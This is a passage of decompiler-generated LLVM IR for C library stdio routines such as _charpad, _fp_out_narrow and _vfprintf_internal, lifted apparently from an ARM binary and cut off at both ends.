  %v2_110d0 = add i32 %v1_110d0, 20
  %v3_110d0 = inttoptr i32 %v2_110d0 to i32*
  store i32 %v0_110d0, i32* %v3_110d0, align 4
  %v0_110d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_110d4 = load i32, i32* @r4, align 4
  %v2_110d4 = add i32 %v1_110d4, 24
  %v3_110d4 = inttoptr i32 %v2_110d4 to i32*
  store i32 %v0_110d4, i32* %v3_110d4, align 4
  %v0_110d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_110d8 = load i32, i32* @r4, align 4
  %v2_110d8 = add i32 %v1_110d8, 28
  %v3_110d8 = inttoptr i32 %v2_110d8 to i32*
  store i32 %v0_110d8, i32* %v3_110d8, align 4
  %v0_110dc = load i32, i32* %r3.global-to-local, align 4
  %v1_110dc = load i32, i32* @r4, align 4
  %v2_110dc = add i32 %v1_110dc, 16
  %v3_110dc = inttoptr i32 %v2_110dc to i32*
  store i32 %v0_110dc, i32* %v3_110dc, align 4
  br label %dec_label_pc_110e0

dec_label_pc_110e0:                               ; preds = %dec_label_pc_110a4, %dec_label_pc_110bc
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_110e4 = load i32, i32* @r4, align 4
  %v2_110e4 = add i32 %v1_110e4, 52
  %v3_110e4 = inttoptr i32 %v2_110e4 to i32*
  store i32 1, i32* %v3_110e4, align 4
  %v0_110e8 = call i32 @__stdio_init_mutex()
  store i32 %v0_110e8, i32* %r0.global-to-local, align 4
  %v0_110ec = load i32, i32* @r4, align 4
  %v1_110ec = add i32 %v0_110ec, 32
  %v2_110ec = inttoptr i32 %v1_110ec to i32*
  %storemerge = load i32, i32* %v2_110ec, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_110f0 = add i32 %storemerge, 56
  store i32 %v1_110f0, i32* @r5, align 4
  %v2_110f4 = icmp eq i32 %storemerge, 0
  store i32 %v1_110f0, i32* %r0.global-to-local, align 4
  br i1 %v2_110f4, label %dec_label_pc_110f0.dec_label_pc_11100_crit_edge, label %dec_label_pc_110a4

dec_label_pc_110f0.dec_label_pc_11100_crit_edge:  ; preds = %dec_label_pc_110e0
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_2a89c.382 to i32*), align 4
  br label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %dec_label_pc_110f0.dec_label_pc_11100_crit_edge, %entry
  %v11_1112814 = phi i32 [ %v1_110f0, %dec_label_pc_110f0.dec_label_pc_11100_crit_edge ], [ %v1_110f06, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_110f0.dec_label_pc_11100_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_2a89c.382 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_111204 = icmp eq i32 %storemerge12, 0
  br i1 %v2_111204, label %dec_label_pc_11128, label %dec_label_pc_1110c

dec_label_pc_1110c:                               ; preds = %dec_label_pc_11100, %dec_label_pc_1110c
  %v0_11114 = phi i32 [ %storemerge1, %dec_label_pc_1110c ], [ %storemerge12, %dec_label_pc_11100 ]
  %v1_1110c = inttoptr i32 %v0_11114 to i8*
  %v2_1110c = load i8, i8* %v1_1110c, align 1
  %v3_1110c = zext i8 %v2_1110c to i32
  store i32 %v3_1110c, i32* %r3.global-to-local, align 4
  %v1_11110 = and i32 %v3_1110c, 64
  store i32 %v0_11114, i32* %r0.global-to-local, align 4
  store i32 69916, i32* @lr, align 4
  %v1_11118 = icmp ne i32 %v1_11110, 0
  call void @__pseudo_cond_branch(i1 %v1_11118, i32 ptrtoint (i32* @global_var_1113c.589 to i32))
  %v0_1111c = load i32, i32* %r4.global-to-local, align 4
  %v1_1111c = add i32 %v0_1111c, 32
  %v2_1111c = inttoptr i32 %v1_1111c to i32*
  %storemerge1 = load i32, i32* %v2_1111c, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_11120 = icmp eq i32 %storemerge1, 0
  br i1 %v2_11120, label %dec_label_pc_11120.dec_label_pc_11128_crit_edge, label %dec_label_pc_1110c

dec_label_pc_11120.dec_label_pc_11128_crit_edge:  ; preds = %dec_label_pc_1110c
  %v11_11128.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11128

dec_label_pc_11128:                               ; preds = %dec_label_pc_11120.dec_label_pc_11128_crit_edge, %dec_label_pc_11100
  %v11_11128 = phi i32 [ %v11_11128.pre, %dec_label_pc_11120.dec_label_pc_11128_crit_edge ], [ %v11_1112814, %dec_label_pc_11100 ]
  %v2_11128 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11128, i32* @r4, align 4
  ret i32 %v11_11128

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 %v1_110f0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_110f06, { 1, 0, 2, 3 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1110c, { 1, 0 }
  uselistorder label %dec_label_pc_110e0, { 1, 0 }
  uselistorder label %dec_label_pc_110a4, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1113c = load i32, i32* @r4, align 4
  store i32 %v3_1113c, i32* %stack_var_-8, align 4
  %v0_11140 = load i32, i32* @r0, align 4
  %v1_11140 = add i32 %v0_11140, 8
  %v2_11140 = inttoptr i32 %v1_11140 to i32*
  %v3_11140 = load i32, i32* %v2_11140, align 4
  %v1_11144 = add i32 %v0_11140, 16
  %v2_11144 = inttoptr i32 %v1_11144 to i32*
  %v3_11144 = load i32, i32* %v2_11144, align 4
  %v9_11148 = icmp eq i32 %v3_11144, %v3_11140
  store i32 %v0_11140, i32* %r4.global-to-local, align 4
  br i1 %v9_11148, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_11140, i32* %v2_11144, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 69980, i32* @lr, align 4
  %v1_11158 = xor i1 %v9_11148, true
  call void @__pseudo_cond_branch(i1 %v1_11158, i32 ptrtoint (i32* @global_var_14dc0.590 to i32))
  %v0_1115c = load i32, i32* %r4.global-to-local, align 4
  %v1_1115c = add i32 %v0_1115c, 8
  %v2_1115c = inttoptr i32 %v1_1115c to i32*
  %v3_1115c = load i32, i32* %v2_1115c, align 4
  %v1_11160 = add i32 %v0_1115c, 16
  %v2_11160 = inttoptr i32 %v1_11160 to i32*
  %v3_11160 = load i32, i32* %v2_11160, align 4
  %v2_11164 = sub i32 %v3_11160, %v3_1115c
  %v2_11168 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11168, i32* @r4, align 4
  ret i32 %v2_11164

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_1116c = load i32, i32* @r4, align 4
  %v6_1116c = load i32, i32* @r5, align 4
  %v9_1116c = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_1118c2 = icmp eq i32 %arg3, 0
  %v2_11190 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_1118c2, label %dec_label_pc_111ac, label %dec_label_pc_111a0

dec_label_pc_11188:                               ; preds = %dec_label_pc_111a0
  %v1_11188 = add i32 %v0_11188, -1
  store i32 %v1_11188, i32* @r4, align 4
  %v2_1118c = icmp eq i32 %v1_11188, 0
  %v0_11198 = load i32, i32* @r6, align 4
  br i1 %v2_1118c, label %dec_label_pc_111ac.loopexit, label %dec_label_pc_111a0

dec_label_pc_111a0:                               ; preds = %entry, %dec_label_pc_11188
  %v0_111984 = phi i32 [ %v0_11198, %dec_label_pc_11188 ], [ %arg1, %entry ]
  %v3_111a0 = call i32 @__stdio_fwrite(i32 %v2_11190, i32 1, i32 %v0_111984)
  %v7_111a4 = icmp eq i32 %v3_111a0, 1
  %v0_11188 = load i32, i32* @r4, align 4
  br i1 %v7_111a4, label %dec_label_pc_11188, label %dec_label_pc_111ac.loopexit

dec_label_pc_111ac.loopexit:                      ; preds = %dec_label_pc_11188, %dec_label_pc_111a0
  %v0_111ac.ph = phi i32 [ %v0_11188, %dec_label_pc_111a0 ], [ 0, %dec_label_pc_11188 ]
  %v1_111ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_111ac

dec_label_pc_111ac:                               ; preds = %dec_label_pc_111ac.loopexit, %entry
  %v1_111ac = phi i32 [ 0, %entry ], [ %v1_111ac.pre, %dec_label_pc_111ac.loopexit ]
  %v0_111ac = phi i32 [ 0, %entry ], [ %v0_111ac.ph, %dec_label_pc_111ac.loopexit ]
  %v2_111ac = sub i32 %v1_111ac, %v0_111ac
  store i32 %v3_1116c, i32* @r4, align 4
  store i32 %v6_1116c, i32* @r5, align 4
  store i32 %v9_1116c, i32* @r6, align 4
  ret i32 %v2_111ac

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_111ac.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_111a0, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_111b8 = load i32, i32* @r4, align 4
  store i32 %v3_111b8, i32* %stack_var_-24, align 4
  %v9_111b8 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_111c0 = and i32 %arg2, 128
  %v2_111c0 = icmp eq i32 %v1_111c0, 0
  %v0_111c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_111c4, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_111c0, label %bb, label %dec_label_pc_111d8

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11218

dec_label_pc_111d8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_111dc = call i32 @strlen(i8* %arg4)
  store i32 %v3_111dc, i32* %r0.global-to-local, align 4
  %v1_111e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_111e0 = sub i32 %v1_111e0, %v3_111dc
  store i32 %v2_111e0, i32* @r4, align 4
  store i32 %v3_111dc, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_111e0, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_111f8

.thread:                                          ; preds = %dec_label_pc_111d8
  store i32 %v3_111dc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11218

dec_label_pc_111f8:                               ; preds = %dec_label_pc_111d8
  %v0_111f8 = load i32, i32* @r6, align 4
  %v1_111f8 = urem i32 %v0_111f8, 128
  %v0_111fc = load i32, i32* @r8, align 4
  store i32 %v0_111fc, i32* %r0.global-to-local, align 4
  %v3_11204 = trunc i32 %v1_111f8 to i8
  %v4_11204 = call i32 @_charpad(i32 %v0_111fc, i8 %v3_11204, i32 %v2_111e0)
  store i32 %v4_11204, i32* %r0.global-to-local, align 4
  %v1_11208 = load i32, i32* @r4, align 4
  %v9_11208 = icmp eq i32 %v4_11204, %v1_11208
  store i32 %v4_11204, i32* %r6.global-to-local, align 4
  br i1 %v9_11208, label %dec_label_pc_11214, label %dec_label_pc_11234

dec_label_pc_11214:                               ; preds = %dec_label_pc_111f8
  %v0_11214 = load i32, i32* @r5, align 4
  store i32 %v0_11214, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11218

dec_label_pc_11218:                               ; preds = %bb, %.thread, %dec_label_pc_11214
  %v5_11224 = phi i32 [ %v0_11214, %dec_label_pc_11214 ], [ %arg3, %bb ], [ %v3_111dc, %.thread ]
  %tmp17 = icmp slt i32 %v5_11224, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_11218
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_11218
  %v5_11220 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_11220, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_14e7c.591 to i32))
  %v0_11230 = load i32, i32* %r6.global-to-local, align 4
  %v2_11230 = add i32 %storemerge, %v0_11230
  store i32 %v2_11230, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %dec_label_pc_111f8, %bb19
  %v0_11234 = phi i32 [ %v4_11204, %dec_label_pc_111f8 ], [ %v2_11230, %bb19 ]
  store i32 %v0_11234, i32* %r0.global-to-local, align 4
  %v2_11238 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11238, i32* %r4.global-to-local, align 4
  store i32 %v9_111b8, i32* %r6.global-to-local, align 4
  ret i32 %v0_11234

; uselistorder directives
  uselistorder i32 %v0_11234, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_11234, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_11218, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1123c = load i32, i32* @r4, align 4
  store i32 %v3_1123c, i32* %stack_var_-36, align 4
  %v6_1123c = load i32, i32* @r5, align 4
  %v15_1123c = load i32, i32* @r8, align 4
  %v18_1123c = load i32, i32* @sb, align 4
  %v21_1123c = load i32, i32* @sl, align 4
  %v24_1123c = load i32, i32* @fp, align 4
  %v2_11244 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_11244, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_11244, i32* %r0.global-to-local, align 4
  %v0_11250 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11250, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_11258 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_11258, i32* %r0.global-to-local, align 4
  %v1_1125c = icmp slt i32 %v2_11258, 0
  br i1 %v1_1125c, label %dec_label_pc_11264, label %dec_label_pc_11298

dec_label_pc_11264:                               ; preds = %entry
  %v3_11264 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_11264, i32* @r4, align 4
  %v1_11268 = inttoptr i32 %v3_11264 to i8*
  store i32 %v3_11264, i32* %r0.global-to-local, align 4
  %v3_1126c = call i32 @strlen(i8* %v1_11268)
  store i32 %v3_1126c, i32* %r0.global-to-local, align 4
  %v2_11270 = icmp eq i32 %v3_1126c, 0
  br i1 %v2_11270, label %bb, label %dec_label_pc_11280

bb:                                               ; preds = %dec_label_pc_11264
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11810

dec_label_pc_11280:                               ; preds = %dec_label_pc_11264
  %v0_11280 = load i32, i32* @r4, align 4
  store i32 %v0_11280, i32* %r0.global-to-local, align 4
  %v0_11284 = load i32, i32* @fp, align 4
  store i32 %v0_11284, i32* %r2.global-to-local, align 4
  %v3_11288 = call i32 @__stdio_fwrite(i32 %v0_11280, i32 %v3_1126c, i32 %v0_11284)
  store i32 %v3_11288, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11810

dec_label_pc_11298:                               ; preds = %entry
  store i32 %v2_11244, i32* %r0.global-to-local, align 4
  %v0_1129c = load i32, i32* @r5, align 4
  %v2_112a0 = call i32 @_ppfs_prepargs(i32 %v2_11244, i32 %v0_1129c)
  store i32 %v2_112a0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_11340 = zext i8 %tmp104 to i32
  %v2_11348 = ptrtoint i32* %stack_var_-252 to i32
  %v2_11368 = ptrtoint i32* %stack_var_-36 to i32
  %v2_11380 = icmp eq i32 %tmp102, 0
  %v1_11394 = inttoptr i32 %tmp101 to i32*
  %v2_11684 = ptrtoint i32* %stack_var_-180 to i32
  %v2_115a0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_115b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_11550 = add i32 %tmp101, 4
  %v4_11550 = inttoptr i32 %v3_11550 to i32*
  %v2_11554 = ptrtoint i32* %stack_var_-328 to i32
  %v7_11414 = zext i8 %tmp99 to i32
  %v2_11450 = ptrtoint i32* %stack_var_-53 to i32
  %v5_11458 = bitcast i32* %stack_var_-53 to i8*
  %v2_11460 = icmp ugt i32 %tmp102, 4
  %v7_11460 = icmp eq i32 %tmp102, 5
  %v0_117f8.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_11378187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_11574 = icmp ugt i32 %tmp102, 16
  %v7_11574 = icmp eq i32 %tmp102, 17
  %v2_11578 = xor i1 %v7_11574, true
  %v3_11578 = and i1 %v2_11574, %v2_11578
  %v2_11614 = icmp ugt i32 %tmp102, 18
  %v7_11614 = icmp eq i32 %tmp102, 19
  %v2_11618 = xor i1 %v7_11614, true
  %v3_11618 = and i1 %v2_11614, %v2_11618
  %v7_11678 = icmp eq i32 %tmp102, 20
  %v2_113b8 = add i32 %tmp102, ptrtoint (i32* @global_var_1ca34.593 to i32)
  %v1_113bc = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1ca34.593 to i32), i32 -1)
  %v2_113bc = inttoptr i32 %v1_113bc to i8*
  %v2_113e8 = xor i1 %v7_11460, true
  %v3_113e8 = and i1 %v2_11460, %v2_113e8
  %v7_1141c = icmp eq i32 %tmp102, 1
  %v2_11468 = xor i1 %v2_11460, true
  %v3_11468 = or i1 %v7_11460, %v2_11468
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_114d0 = icmp eq i32 %tmp102, 3
  %v11_114dc = icmp eq i32 %tmp102, 4
  %v9_1134c = mul nuw nsw i32 %v4_11340, 8
  %v10_1134c = add nsw i32 %v9_1134c, -8
  %v6_11354 = add i32 %v10_1134c, %v2_11348
  br label %dec_label_pc_117f8

bb126:                                            ; preds = %dec_label_pc_112b0.outer, %.thread7
  %v2_112b0185 = phi i8 [ %v2_112b0, %.thread7 ], [ %v2_112b0181, %dec_label_pc_112b0.outer ]
  %v1_112c4184 = phi i32 [ %v2_112c4, %.thread7 ], [ %v0_112b049, %dec_label_pc_112b0.outer ]
  %v8_112b8 = icmp eq i8 %v2_112b0185, 37
  br i1 %v8_112b8, label %dec_label_pc_112cc, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_112c4 = add i32 %v1_112c4184, 1
  store i32 %v2_112c4, i32* @r4, align 4
  %v1_112b0 = inttoptr i32 %v2_112c4 to i8*
  %v2_112b0 = load i8, i8* %v1_112b0, align 1
  %v3_112b0 = zext i8 %v2_112b0 to i32
  store i32 %v3_112b0, i32* %r3.global-to-local, align 4
  %v2_112b4 = icmp eq i8 %v2_112b0, 0
  br i1 %v2_112b4, label %dec_label_pc_112cc, label %bb126

dec_label_pc_112cc:                               ; preds = %bb126, %.thread7, %dec_label_pc_112b0.outer
  %v1_112c4.lcssa = phi i32 [ %v0_112b049, %dec_label_pc_112b0.outer ], [ %v2_112c4, %.thread7 ], [ %v1_112c4184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_112cc = sub i32 %v1_112c4.lcssa, %v5_112dc
  %v9_112cc = icmp eq i32 %v1_112c4.lcssa, %v5_112dc
  br i1 %v9_112cc, label %dec_label_pc_11300, label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %dec_label_pc_112cc
  store i32 %v2_112cc, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_112cc, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_112d4
  store i32 %v5_112dc, i32* %r0.global-to-local, align 4
  %v5_112e4 = load i32, i32* @fp, align 4
  store i32 %v5_112e4, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_112d4, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_112d4 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_14e7c.591 to i32))
  %v0_112ec = load i32, i32* %r0.global-to-local, align 4
  %v1_112ec = load i32, i32* @r5, align 4
  %v9_112ec = icmp eq i32 %v0_112ec, %v1_112ec
  br i1 %v9_112ec, label %dec_label_pc_112f4, label %dec_label_pc_11808

dec_label_pc_112f4:                               ; preds = %bb130
  %v2_112f8 = add i32 %v0_112ec, %stack_var_-336.1.ph
  %v0_11300.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11300

dec_label_pc_11300:                               ; preds = %dec_label_pc_112cc, %dec_label_pc_112f4
  %v0_11314 = phi i32 [ %v5_112dc, %dec_label_pc_112cc ], [ %v0_11300.pre, %dec_label_pc_112f4 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_112cc ], [ %v2_112f8, %dec_label_pc_112f4 ]
  %v1_11300 = inttoptr i32 %v0_11314 to i8*
  %v2_11300 = load i8, i8* %v1_11300, align 1
  %v3_11300 = zext i8 %v2_11300 to i32
  store i32 %v3_11300, i32* %r3.global-to-local, align 4
  %v2_11304 = icmp eq i8 %v2_11300, 0
  br i1 %v2_11304, label %dec_label_pc_11810, label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %dec_label_pc_11300
  %v1_1130c = add i32 %v0_11314, 1
  %v2_1130c = inttoptr i32 %v1_1130c to i8*
  %v3_1130c = load i8, i8* %v2_1130c, align 1
  %v4_1130c = zext i8 %v3_1130c to i32
  store i32 %v4_1130c, i32* %r3.global-to-local, align 4
  %v7_11310 = icmp eq i8 %v3_1130c, 37
  store i32 %v1_1130c, i32* %r2.global-to-local, align 4
  br i1 %v7_11310, label %dec_label_pc_11800, label %dec_label_pc_1131c

dec_label_pc_1131c:                               ; preds = %dec_label_pc_1130c
  store i32 %v2_11244, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_11244, i32* %r0.global-to-local, align 4
  store i32 %v1_1130c, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_11330 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_11244, i32* @r0, align 4
  %v0_11338 = call i32 @_ppfs_setargs()
  store i32 %v0_11338, i32* %r0.global-to-local, align 4
  store i32 %v4_11340, i32* %ip.global-to-local, align 4
  store i32 %v2_11348, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_1131c
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_1131c
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_11354, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_1136078 = phi i32 [ %v6_11354, %bb133 ], [ %v2_11348, %.thread ]
  store i32 %v2_11368, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_11378187, label %dec_label_pc_11360, label %dec_label_pc_1137c

dec_label_pc_11360:                               ; preds = %bb134, %dec_label_pc_11360
  %v5_11370189 = phi i32 [ %v5_11370, %dec_label_pc_11360 ], [ %v2_11368, %bb134 ]
  %v0_11360188 = phi i32 [ %v1_11364, %dec_label_pc_11360 ], [ %v0_1136078, %bb134 ]
  %v2_11360 = add i32 %v5_11370189, -4
  %v3_11360 = inttoptr i32 %v2_11360 to i32*
  store i32 %v0_11360188, i32* %v3_11360, align 4
  %v0_11364 = load i32, i32* %r3.global-to-local, align 4
  %v1_11364 = add i32 %v0_11364, 8
  store i32 %v1_11364, i32* %r3.global-to-local, align 4
  %v0_1136c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1136c.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_11368, i32* @lr, align 4
  %v4_11370 = mul i32 %v0_1136c.pre, 4
  %v5_11370 = add i32 %v4_11370, %v2_11368
  %v1_11374 = add i32 %v0_1136c.pre, 1
  store i32 %v1_11374, i32* %r2.global-to-local, align 4
  %v5_11378 = icmp slt i32 %v0_1136c.pre, %v1_1136c.pre
  br i1 %v5_11378, label %dec_label_pc_11360, label %dec_label_pc_1137c

dec_label_pc_1137c:                               ; preds = %dec_label_pc_11360, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_11380, label %dec_label_pc_11388, label %dec_label_pc_113ac

dec_label_pc_11388:                               ; preds = %dec_label_pc_1137c
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_11394 = load i32, i32* %v1_11394, align 4
  store i32 %v2_11394, i32* %r0.global-to-local, align 4
  %v1_11398 = and i32 %v0_113dc, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_113a0 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_113a0, i32* %r3.global-to-local, align 4
  %v4_113a4 = inttoptr i32 %v2_11394 to i8*
  %v5_113a4 = call i32 @_store_inttype(i8* %v4_113a4, i32 %v1_11398, i32 %stack_var_-336.2, i32 %v3_113a0)
  store i32 %v5_113a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_117f4

dec_label_pc_113ac:                               ; preds = %dec_label_pc_1137c
  br i1 %tmp195, label %dec_label_pc_11538, label %dec_label_pc_113b4

dec_label_pc_113b4:                               ; preds = %dec_label_pc_113ac
  store i32 %v2_113b8, i32* %r3.global-to-local, align 4
  %v3_113bc = load i8, i8* %v2_113bc, align 1
  %v4_113bc = zext i8 %v3_113bc to i32
  store i32 %v4_113bc, i32* @r4, align 4
  %v7_113c0 = icmp eq i8 %v3_113bc, 10
  br i1 %v7_113c0, label %dec_label_pc_113cc, label %bb135

bb135:                                            ; preds = %dec_label_pc_113b4
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_113cc:                               ; preds = %dec_label_pc_113b4
  store i32 %v0_113dc, i32* %r3.global-to-local, align 4
  %v1_113d0 = and i32 %v0_113dc, 32
  %v2_113d0 = icmp eq i32 %v1_113d0, 0
  %.175 = select i1 %v2_113d0, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_113dc = and i32 %v0_113dc, 64
  %v2_113dc = icmp eq i32 %v1_113dc, 0
  br i1 %v2_113dc, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_113cc
  %.176 = select i1 %v2_113d0, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_113cc, %bb138
  br i1 %v3_113e8, label %.thread84, label %dec_label_pc_113f0

.thread84:                                        ; preds = %bb139
  %v5_113e8 = sub nsw i32 0, %v4_113bc
  store i32 %v5_113e8, i32* @r4, align 4
  br label %dec_label_pc_11408

dec_label_pc_113f0:                               ; preds = %bb139
  br i1 %v7_114d0, label %bb140, label %dec_label_pc_113fc

bb140:                                            ; preds = %dec_label_pc_113f0
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_11408

dec_label_pc_113fc:                               ; preds = %dec_label_pc_113f0
  br i1 %v7_1141c, label %dec_label_pc_1140c, label %dec_label_pc_11408

